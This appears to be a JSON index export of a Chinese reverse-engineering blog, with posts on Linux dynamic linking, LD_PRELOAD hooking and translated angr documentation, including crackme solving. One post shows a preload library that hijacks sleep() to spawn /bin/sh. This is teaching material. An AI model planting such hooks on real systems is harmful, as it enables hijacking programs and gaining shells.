","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:4:0","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"动态链接概述 程序员在编写代码时，常常需要使用外部库。外部库有静态库和动态库之分，二者都是经过编译、汇编但未进行链接的二进制文件（ELF文件）。 二者区别在于下一步参与链接的方式：静态库用于静态链接，直接将静态库中的指令写入最终生成的可执行文件中。动态库用于动态链接，只将一些重定位和符号表信息“拷贝”到最终的可执行文件中。 动态链接相比于静态链接，优势在于得到的可执行文件小很多，可扩展性更好、更新迭代更容易（只需更改动态链接库而不用整个重新编译）。劣势也很明显：需要运行时动态加载库函数，消耗更多时间和资源（但在很多场合中这种消耗是值得的），再有就是兼容性降低：不同的机器上的同名动态库可能有所不同，产生兼容性问题。 ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:1:0","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"代码中使用动态链接库的两种方式 ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:2:0","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"加载时链接 需要包含头文件，但代码中无需多余的语句，示例如下： main.c #include \"lib.h\" int main() { func(); return 0; } lib.h #include \u003cstdio.h\u003e void func(); lib.c #include \"lib.h\" void func() { puts(\"func is called\"); } 生成动态链接库 gcc -fPIC --shared lib.c -o lib.so 使用动态链接库构建可执行文件 gcc -o main main.c lib.so 此时直接运行main会报错无法找到动态链接库，这里需要指定环境变量LD_LIBRARY_PATH export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:./ 然后运行./main就可以看见正常程序输出 ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:2:1","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"运行时链接 使用dlfcn.h中封装的函数，在代码中需要的地方手动链接所需的动态库 此时不需要lib.h文件，可以直接在lib.c中编写函数逻辑： #include \u003cstdio.h\u003e void func() { puts(\"func is called\"); } 生成动态库lib.so gcc -fPIC --shared lib.c -o lib.so main.c #include \u003cdlfcn.h\u003e int main() { // 打开动态链接库，获得动态链接库的handle void *handle = dlopen(\"./lib.so\", RTLD_LAZY); // 定义func变量形式，准备接收func函数 void (*func)(); // 传入动态链接库的handle和寻找的符号 func = dlsym(handle, \"func\"); // 正常调用func函数 func(); return 0; } 编译链接生成可执行文件 gcc -o main main.c 直接运行./main可正确执行函数 ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:2:2","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"使用LD_PRELOAD进行hook ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:0","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"hook的基本原理 编译器在进行链接时，会首先加载环境变量LD_PRELOAD所指向的动态链接库。由于链接的具体步骤（此处不赘述，详情可查阅csapp或其他资料），同名的符号不会被重复加载，所以我们可以使用自己的动态库“覆盖”原来程序使用动态库的一些符号，达到hook的目的 ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:1","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"针对上述加载时链接的hook 编写hook.c，包含同名函数func： #include \u003cstdio.h\u003e void func() { puts(\"func is hooked\"); } 生成动态链接库hook.so gcc -fPIC --shared hook.c -o hook.so 原来生成的main可执行文件不变（环境变量也不变），执行： LD_PRELOAD=./hook.so ./main 可以发现func函数执行的是lib.c中的代码，hook成功 ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:2","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"无法针对运行时链接进行hook 显而易见的，运行时链接是指定了文件路径、获取制定文件中的符号，故无法通过LD_PRELOAD进行hook ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:3","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"针对libc库中默认符号的hook 明白了hook的原理很容易发现，我们自己写的func函数与libc库中默认符号没有什么本质的区别，故只要定义同名的符号，就可以实现同样的hook 此处以sleep函数为例，具体过程与上面无异，仅展示代码 main.c #include \u003cstdio.h\u003e int main() { puts(\"hello, my friend\"); sleep(3); puts(\"bye\"); return 0; } hook.c #include \u003cstdio.h\u003e void sleep() { puts(\"hacked by dx3906\"); } 直接运行./main和使用环境变量LD_PRELOAD=./hook.so ./main会有截然不同的效果 ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:4","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"通过hook到system函数get shell 这里仅仅是对此hook手段用途的一些畅想，实际上所用方法完全一致，这也是LD_PRELOAD进行hook极大的局限性。 在能够hook的情况下，只需把hook函数的内容变成system调用即可get shell 如把上个例子的hook.c改为如下： #include \u003cstdlib.h\u003e void sleep() { system(\"/bin/sh\"); } 原理已明，更多的用途读者可以尽情发挥想象力与创造力 以上，如有疏漏请师傅们指出。 ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:3:5","tags":["linux","reverse","binary"],"title":"linux下通过设置LD_PRELOAD环境变量hook动态链接库","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Life"],"content":"新域名：blog.dx39061.top 原来域名快到期了，续费又太贵，所以换了个，只是后缀从xyz换成了top 原域名解析还在不在了，但使用原域名打开会遇到证书错误问题. ","date":"2022-10-17","objectID":"/2022/10/%E5%8D%9A%E5%AE%A2%E5%9F%9F%E5%90%8D%E6%9B%B4%E6%8D%A2/:1:0","tags":["life"],"title":"博客域名更换","uri":"/2022/10/%E5%8D%9A%E5%AE%A2%E5%9F%9F%E5%90%8D%E6%9B%B4%E6%8D%A2/"},{"categories":["Angr"],"content":"Execution Engines 当你使用angr进行单步执行时，某些东西实际地进行了执行，即angr的一系列引擎（SimEngine的子类），它们会模拟给定代码段对输入状态的影响。angr的执行内核只是依次尝试所有可用的引擎，使用第一个可以处理该步骤的引擎。默认的引擎列表，按顺序排列如下： 故障引擎（failuer engine）：当某一步导致一个无法继续的状态时，故障引擎启动。 系统调用引擎（syscall engine）：当某一部产生系统调用时，系统调用引擎启动。 hook引擎（hook engine）：当当前地址被hook时启动 unicorn引擎（unicorn engine）：当UNICORN状态选项开启并且状态中无符号数据时unicorn引擎启动 VEX引擎（VEX engine）：VEX引擎是最终后备引擎 ","date":"2022-09-29","objectID":"/2022/09/execution_engines/:0:0","tags":["reverse","angr"],"title":"angr文档翻译（七）Execution Engines","uri":"/2022/09/execution_engines/"},{"categories":["Angr"],"content":"模拟后继（SimSuccessors） 实际上依次尝试所有可用引擎的函数是project.factory.successprs(state, **kwargs)，它将参数传递给每个引擎。这个函数是state.step()和simulation_manager.step()的核心，它返回一个SimSuccessors对象。设计SimSuccessors的目的是对存储在各种列表属性中的后继状态进行简单分类，如下： 类别（Attribute） 警戒条件（Guard Condition） 命令指针（Instruction Pointer） 描述（Description） successors True（可以被符号化，但被限制为True） 可以被符号化（但最多有256个solution）参阅unconstrained_successors 引擎处理正常可满足的状态，该状态的指令指针可能是符号化的（根据用户输入进行跳转），所以这个状态可能代表了几个潜在的后继状态 unsat_successors False（可以被符号化，但被限制为False） 可以被符号化 不可满足的后继状态，它的Guard Condition只能为Flase（即不能进行跳转或必须进行默认分支跳转） flat_successors True（可以被符号化，但被限制为True） 具体的值 如上所述，后继列表中的状态可以具有符号指令指针。这个理解起来十分复杂，和在其他地方的代码（例如SimEngineVEX.process当其中状态向前执行时），我们假设单个状态仅代表代码中单个点的执行。为了便于理解，当我们遇到带有符号指令指针的后继状态时我们为它们计算所有可能的solution，并为每一个这样的solution制作一份状态拷贝，我们称这个过程为扁平化。这些flat_successors是一些状态，它们每个状态都带有一个不同的具体值的指令指针。举个例子，如果后继状态的指令指针是X+5，而X有X\u003e0x800000和X\u003c=0x800010的约束。我们会将其展平为16个不同的flat_successors状态，指令指针从0x800006一直到0x80015 unconstrained_successors True（可以被符号化，但被限制为True） 符号化（超过256个solution） 在上述的扁平化过程中，如果指令指针有超过256种可能的solution，我们就假设该指令地址已被无约束数据覆盖（例如用户数据的栈溢出），这个情况一般是不合理的，这些状态被放在unconstrained_successors中，而不是后继状态中 all_successors anything 可以被符号化 上述三个successors的集合 ","date":"2022-09-29","objectID":"/2022/09/execution_engines/:1:0","tags":["reverse","angr"],"title":"angr文档翻译（七）Execution Engines","uri":"/2022/09/execution_engines/"},{"categories":["Angr"],"content":"断点（Breakpoints） TODO: rewrite this to fix the narrative 和任何一个不错的执行引擎一样，angr支持设置断点。这很酷！你可以像下面这样设置断点： \u003e\u003e\u003e import angr \u003e\u003e\u003e b = angr.Project('examples/fauxware/fauxware') \u003e\u003e\u003e s = b.factory.entry_state() # 添加一个断点，在发生内存写入之前放入ipdb \u003e\u003e\u003e s.inspect.b('mem_write') # 或者，我们可以在内存写入发生之后立即触发断点 # 我们也可以运行一个回调函数而不是打开ipdb \u003e\u003e\u003e def debug_func(state): print(\"State %s is about to do a memory write!\") \u003e\u003e\u003e s.inspect.b('mem_write', when=angr.BP_AFTER, action=debug_func) # 或者，你可以把它放到你的ipython中 \u003e\u003e\u003e s.inspect.b('mem_write', when=angr.BP_AFTER, action=angr.BP_IPYTHON) 除了内存写入之外，还有其他很多地方可以设置断点。下面展示的是个可设置断点的事件列表，你都可以把他们设置为BP_BEFORE或BP_AFTER Event type Event meaning mem_read 内存被读取时 mem_write 内存被写入时 address_concretization 正在解析符号化内存访问 reg_read 一个寄存器被读取时 reg_write 一个寄存器被写入时 tmp_read 一个临时变量被读取时 tmp_write 一个临时变量被写入时 expr 正在创建表达式（即获得算术运算的结果或IR中的常数） statement 正在翻译一个IR声明（statement） instruction 正在翻译一条新的（本机）指令 irsb 正在翻译一个基本块 constraints 新的约束被添加到state中 exit 正在从执行中生成后继状态 fork 一个符号执行状态分叉成多个状态 symbolic_variable 正在创建一个新的符号变量 call 正在执行call指令 return 正在执行ret指令 simprocedure 正在执行simprocedure（或syscall） dirty 正在执行dirty IR callback syscall syscall被执行（除了simprocedure事件之外的调用） engine_process SimEngine即将处理一些代码 这些事件拥有不同的属性： （表格太长不搬了）链接：https://docs.angr.io/core-concepts/simulation 这些属性可以在适当的断点回调期间作为state.inspect的成员访问，以获取适当的值。你甚至可以修改这些值来为你所用 \u003e\u003e\u003e def track_reads(state): ... print('Read', state.inspect.mem_read_expr, 'from', state.inspect.mem_read_address) ... \u003e\u003e\u003e s.inspect.b('mem_read', when=angr.BP_AFTER, action=track_reads) 此外，这些属性都可以作为inspect.b的参数，使断点被条件约束： # 如果0x1000是目标表达式的可能值，则将会在内存写入之前触发断点 \u003e\u003e\u003e s.inspect.b('mem_write', mem_write_address=0x1000) # 如果0x1000是目标表达式的唯一可能值，则将在内存写入之前触发断点 \u003e\u003e\u003e s.inspect.b('mem_write', mem_write_address=0x1000, mem_write_address_unique=True) # 若0x1000是从内存中读取的最后一个表达式的可能值，则会在0x8000指令之后触发断点 \u003e\u003e\u003e s.inspect.b('instruction', when=angr.BP_AFTER, instruction=0x8000, mem_read_expr=0x1000) 事实上，我们甚至可以指定一个函数作为条件 # 这是一个复杂条件，它确保RAX为0x41414141并且从0x8004开始的基本块在此路径之前的某个时间执行 \u003e\u003e\u003e def cond(state): ... return state.eval(state.regs.rax, cast_to=str) == 'AAAA' and 0x8004 in state.inspect.backtrace \u003e\u003e\u003e s.inspect.b('mem_write', condition=cond) ","date":"2022-09-29","objectID":"/2022/09/execution_engines/:2:0","tags":["reverse","angr"],"title":"angr文档翻译（七）Execution Engines","uri":"/2022/09/execution_engines/"},{"categories":["Angr"],"content":"关于使用mem_read断点的注意事项 每当程序读取内存时，就会触发mem_read断点。如果在设置这种断点的同时还使用state.mem从内存地址加载数据，那么断点也将被触发 因此，如果你想从内存中加载数据而不触发mem_read断点，请使用state.memory.load携带关键词参数disabl_actions=True和inspect=False 对于state.find方法也同上 ","date":"2022-09-29","objectID":"/2022/09/execution_engines/:3:0","tags":["reverse","angr"],"title":"angr文档翻译（七）Execution Engines","uri":"/2022/09/execution_engines/"},{"categories":["Angr"],"content":"Simulation Managers Simulation Manager是angr中最重要的控制模块，它让你能够控制不同状态的符号执行，使用搜索策略来探索程序的状态空间。在这一节中，你将学会如何使用它。 Simulation Manager让你以一种巧妙的方式处理多个状态。多种状态组成“存储区（stashes）”，你可以任意前进、过滤、合并和移动。例如，你可以以不同速率步进两个不同的存储区，然后将它们合并在一起。大多数操作的默认存储区是active存储区，当你初始化simlation manager时，状态就放在里面。 ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:0:0","tags":["reverse","angr"],"title":"angr文档翻译（六）Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"单步执行（Stepping） simulation manager最基础的功能是通过.step()将默认存储区的所有状态向前推进一个基本块。 \u003e\u003e\u003e import angr \u003e\u003e\u003e proj = angr.Project('examples/fauxware/fauxware', auto_load_libs=False) \u003e\u003e\u003e state = proj.factory.entry_state() \u003e\u003e\u003e simgr = proj.factory.simgr(state) \u003e\u003e\u003e simgr.active [\u003cSimState @ 0x400580\u003e] \u003e\u003e\u003e simgr.step() \u003e\u003e\u003e simgr.active [\u003cSimState @ 0x400540\u003e] 当然，存储区模型真正的威力在于，当一个状态遇到符号分支条件时，两个后继状态都会出现在存储区中，然后你可以同步执行两个分支。当你并不关心程序控制流只想单步执行到结束时，可以使用.run()方法 # 运行直到第一个符号分支 \u003e\u003e\u003e while len(simgr.active) == 1: ... simgr.step() \u003e\u003e\u003e simgr \u003cSimulationManager with 2 active\u003e \u003e\u003e\u003e simgr.active [\u003cSimState @ 0x400692\u003e, \u003cSimState @ 0x400699\u003e] # 运行直到程序退出 \u003e\u003e\u003e simgr.run() \u003e\u003e\u003e simgr \u003cSimulationManager with 3 deadended\u003e 我们现在有3个挂掉的状态！当一个状态在执行过程中没有产生任何后继状态时，例如，程序执行到了exit系统调用，这个状态就会被从active存储区移除放到deadended存储区中 ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:1:0","tags":["reverse","angr"],"title":"angr文档翻译（六）Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"存储区管理（Stash Management） 让我们看看如何使用其他存储区。 要在存储区之间移动一个状态，可以使用.move()方法，参数为from_stash``to_stash和filter_func（可选的，默认是移动一切）。例如，我们可以移动输出中包含热指定字符串的state： \u003e\u003e\u003e simgr.move(from_stash='deadended', to_stash='authenticated', filter_func=lambda s: b'Welcome' in s.posix.dumps(1)) \u003e\u003e\u003e simgr \u003cSimulationManager with 2 authenticated, 1 deadended\u003e 我们在移动指定state的同时，创建了一个叫“authenticated”的存储区。存储区中每个state在其标准输出中都有“Welcome”，这是一个很好的做法。 每个存储区都只是一个列表，你可以使用下表索引或迭代访问每个单独的state，但是也有一些方法可以替代使用。如果你在存储区名前加一个one_前缀，你将得到存储区中的第一个state。如果你在存储区名前加一个mp_前缀，你将得到该存储区的mulpyplexed版本 \u003e\u003e\u003e for s in simgr.deadended + simgr.authenticated: ... print(hex(s.addr)) 0x1000030 0x1000078 0x1000078 \u003e\u003e\u003e simgr.one_deadended \u003cSimState @ 0x1000030\u003e \u003e\u003e\u003e simgr.mp_authenticated MP([\u003cSimState @ 0x1000078\u003e, \u003cSimState @ 0x1000078\u003e]) \u003e\u003e\u003e simgr.mp_authenticated.posix.dumps(0) MP(['\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SOSNEAKY\\x00', '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x80\\x80\\x80\\x80@\\x80@\\x00']) 当然，step``run和其他操作单个存储区的方法都可以携带一个stash参数，指明是对那个存储区操作 simulation manager为你提供了许多有趣的工具来管理存储区。我们暂时不会讨论其他内容，你可以查看API文档了解细节。 ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:2:0","tags":["reverse","angr"],"title":"angr文档翻译（六）Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"存储区类型（Stash types） 你可以任意使用存储区，但有一些存储区被用来对某些特殊类型的状态进行分类。 active：此存储器包含默认情况下使用step方法会被执行的state，除非特别指定了存储区 deadended：当一个state由于某种原因不能继续执行时，它会进入deadended存储区，包括没有更多有效指令，所有后继状态无解和无效的指令指针。 pruned：当使用LAZY_SOLVES时，非必要不会检查状态是否满足。当在LAZY_SOLVES存在时约束条件不满足时，state会遍历层次结构，找到最初不满足的state，该状态的所有后继状态都会被剪除并放入此存储区中 unconstrained：当Simulation Manager的构造函数被指定save_unconstrained选项时，则将被确定为不受约束的state放在此存储区 unsat：当Simulation Manager的构造函数被指定save_unsat选项时，则将被确定为不满足约束（有矛盾约束）的state放在此存储区 还有一个不是存储区的state列表：errored，如果在符号执行期间发生错误，则state将被包装在ErrorRecord对象中，其中包含state和它引发的错误信息，然后这条记录将被插入到errored中。你可以通过record.state获取错误发生之前的状态，通过record.error得到引发的错误，并且你可以通过record.debug()在引发错误的位置启动调试shell，这是一个非常宝贵的调试工具！ ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:3:0","tags":["reverse","angr"],"title":"angr文档翻译（六）Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"简单的符号执行探索（Simple Exploration） 运用符号执行的一个常见的目的是得到程序运行到特定地址时的状态，同时丢弃通过另一个地址的所有状态，simulation manager有这个模式的快捷方法，可以使用explore()方法 当使用.explore()方法并携带find参数时，符号执行将一直进行直到得到与查找条件匹配的状态，find参数可以是某个地址，也可以是某些地址组成的列表，还可以是接受state参数返回是否成功的断言的函数。当active存储区中的任何状态与find的条件匹配时，这些state会被放进found存储区，并且中止符号执行。之后你可以继续符号执行探索found存储区中的状态，或者丢弃这些状态并继续其他状态。你还可以使用avoid指定与find相同的条件参数，当一个状态符合avoid条件时，它会被放进avoid存储区中，并继续执行。最终，num_find参数控制在angr结束之前应该找到的状态数，默认值为1。当然，如果你在找到足够数量满足条件的状态之前用完了active存储区中所有的状态，则无论如何都会停止执行。 我们以crackme程序为例 首先，我们要加载这个二进制程序 \u003e\u003e\u003e proj = angr.Project('examples/CSCI-4968-MBE/challenges/crackme0x00a/crackme0x00a') 下一步，创建Simulation Manager \u003e\u003e\u003e simgr = proj.factory.simgr() 现在，我们进行符号执行直到我们找到一个状态符合我们指定的条件 \u003e\u003e\u003e simgr.explore(find=lambda s: b\"Congrats\" in s.posix.dumps(1)) \u003cSimulationManager with 1 active, 1 found\u003e 现在，我们可以从state中得到flag \u003e\u003e\u003e s = simgr.found[0] \u003e\u003e\u003e print(s.posix.dumps(1)) Enter password: Congrats! \u003e\u003e\u003e flag = s.posix.dumps(0) \u003e\u003e\u003e print(flag) g00dJ0B! 十分简单，不是吗？ ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:4:0","tags":["reverse","angr"],"title":"angr文档翻译（六）Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"探索技术（Expolration Techniques） angr附带了几个固定功能，可以让你自定义Simulation Manager的行为，这些功能叫做expolration techniques。至于为什么要使用探索技术，一个典型的例子是可以修改探索程序状态空间的模式，默认“一次执行所有操作”策略实际上是广度优先搜索，但是通过探索技术，你可以实现深度优先搜索。这些技术的能力远比这个例子更加灵活——你可以完全改变angr执行的行为。编写自己的探索技术将在后面的章节中介绍。 要使用探索技术，请调用simgr.use_technique(tech)，其中tech是EXploration Technique子类的一个实例。angr内置的探索技术可以在angr.exploration_techniques找到 下面是一些内置技术的概览： DFS：深度优先搜索，active存储区只存放一个state，其他state被放入deferred存储区直到active存储区的state终止或产生错误 Explorer：这个技术实现了.explore()方法，可以指定explore和avoid LengthLimiter：限制状态通过路径的最大长度 LoopSeer：使用循环计数的合理近似值来暂时丢弃通过循环次数过多的状态，将他们放入spinning存储区，如果其他可行的状态被用完，则重新将他们拉出使用 ManualMergepoint：将程序中一个地址标记为合并点，到达该地址的状态将被暂时保存，并且在超时时间内到达同一点的其他状态都将被合并在一起。 MemoryWatcher：监控simgr执行过程中系统内存空闲，如果变得太低，则停止执行 Oppologist：“operation apologist”是一个特别有趣的小工具——如果启用此技术并且angr遇到不受支持的指令，例如，一个奇怪的外来浮点SIMD操作，它会将所有输入具体化并使用unicorn引擎模拟单个指令，从而允许继续执行 Spiller：当active存储区状态过多时，此技术可以将其中一些状态转存到磁盘以保持较低的内存消耗 Threading：将线程级并行性添加到执行过程。由于python的全局解释器锁，这并没有多大帮助，但是如果你有一个程序的分析花费大量时间在angr的本机代码依赖项（unicorn、z3、libvex）中，你可能会获得一些收益 Tracer：一种探索技术，它使符号执行遵循从其他来源记录的动态跟踪。动态跟踪器存储库有一些工具可以生成这些跟踪 Veritesting：关于自动识别有用合并点的CMU论文的实现，它十分有用，你可以在构造Simulation Manager时使用veritesting=True参数来开启这个技术！请注意，由于它实现的是静态符号执行的侵入性方式，它通常不能与其他技术配合使用。 查看Simulation Manager和探索技术的API文档以获取更多信息 ","date":"2022-09-15","objectID":"/2022/09/simulation_manager/:5:0","tags":["reverse","angr"],"title":"angr文档翻译（六）Simulation Managers","uri":"/2022/09/simulation_manager/"},{"categories":["Angr"],"content":"Program State 到目前为止，我们只使用了angr的程序状态模拟（SimState objects），以最简单的方式展示了有关angr的基本操作。这一节中，你将了解state对象的结构以及如何与state交互。 ","date":"2022-09-14","objectID":"/2022/09/program_state/:0:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"回顾：读写内存和寄存器（Review: Reading and writing memory and registers） 如果你按顺序读了该文档之前的内容（你也应该这样做，至少应该按顺序读完第一部分），你已经了解了访问内存和寄存器的基本操作，state.regs接受寄存器名称作为参数可以对寄存器进行读写，state.mem可以用地址作为索引获取相应地址的值，索引后可以指定数据类型。 以下是一些示例： \u003e\u003e\u003e import angr, claripy \u003e\u003e\u003e proj = angr.Project('/bin/true') \u003e\u003e\u003e state = proj.factory.entry_state() # 把rsp的值复制到rbp \u003e\u003e\u003e state.regs.rbp = state.regs.rsp # 把rdx的值存到地址为0x1000内存中 \u003e\u003e\u003e state.mem[0x1000].uint64_t = state.regs.rdx # 改变rbp所指向的地址 \u003e\u003e\u003e state.regs.rbp = state.mem[state.regs.rbp].uint64_t.resolved # add rax, qword ptr [rsp + 8] \u003e\u003e\u003e state.regs.rax += state.mem[state.regs.rsp + 8].uint64_t.resolved ","date":"2022-09-14","objectID":"/2022/09/program_state/:1:0","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"/2022/09/program_state/"},{"categories":["Angr"],"content":"基础执行（Basic Execution） 早些时候，我们展示了如何使用Simulation Manager来进行一些基本的执行。我们将在下一节展示Simulation Manager的全部功能，但我们现在可以使用一种各简单的接口state.step()来演示符号执行的工作原理。这个接口会进行一步符号执行，并返回一个SimSuccessors对象。与一般的模拟执行相比，符号执行可以产生多个可以按多种方式分类的后继状态。现在，我们关心的是这个对象的.successors属性，它会返回一个包含给定步骤的所有“正常”后续状态的列表。 为什么返回的是一个列表，而不是一个唯一的后继状态？angr的符号执行过程只是将单个指令的操作编译到程序中并执行它们以改变SimState。当遇到像if(x\u003e4)这样的代码时，如果x是符号变量会发生什么呢？在angr的底层某个地方，会处理x\u003e4语句，结果将是\u003cBool x_32_1 \u003e 4\u003e 这很好，但下一个问题是，我们是选择“true”分支还是“false”分支？答案是：两个分支都会被执行，产生两个完全独立的后继状态。在第一个state中，我们添加x\u003e4作为约束条件，在第二个state中，我们添加!(x\u003e4)作为约束条件。每当我们使用这些后继状态中的任何一个进行约束求解时，状态的条件确保我们得到的任何有效值都是有效的输入，这将导致重复执行遵循给定状态的路径 为了证明这一点，让我们以fake firmware images为例，如果你查看这个二进制文件的源代码，你会发现固件的身份验证机制是存在后门的：任何用户名都可以通过密码“SOSNEAKY”获得管理员权限。更进一步来说，与用户输入的比较就是存在后门的，所以如果我们单步执行进行比较，获得多个后继状态。其中一种状态将包含将用户输入限制为后门密码的条件。以下代码片段实现了这一点： \u003e\u003e\u003e proj = angr.Project('examples/fauxware/fauxware') \u003e\u003e\u003e state = proj.factory.entry_state(stdin=angr.SimFile) # 目前请忽略这个配置，为了教学，我们禁用了更复杂的默认配置 \u003e\u003e\u003e while True: ... succ = state.step() ... if len(succ.successors) == 2: ... break ... state = succ.successors[0] \u003e\u003e\u003e state1, state2 = succ.successors \u003e\u003e\u003e state1 \u003cSimState @ 0x400629\u003e \u003e\u003e\u003e state2 \u003cSimState @ 0x400699 